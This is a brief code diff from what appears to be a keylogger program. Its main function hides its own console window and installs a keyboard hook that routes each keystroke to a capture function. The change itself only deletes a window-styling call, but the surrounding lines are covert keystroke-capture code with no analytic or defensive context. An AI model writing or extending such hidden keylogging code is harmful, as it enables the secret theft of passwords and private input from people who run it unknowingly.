@@ -7,7 +7,6 @@ main()
 {
 	const HWND hwnd = GetConsoleWindow();
 	ShowWindow(hwnd, SW_HIDE);
-	DwmSetWindowAttribute(hwnd, DWMWCP_DONOTROUND, 0, 0);
 
 	hook hhook;
 	hhook.keystroke = &capture::capture_key;
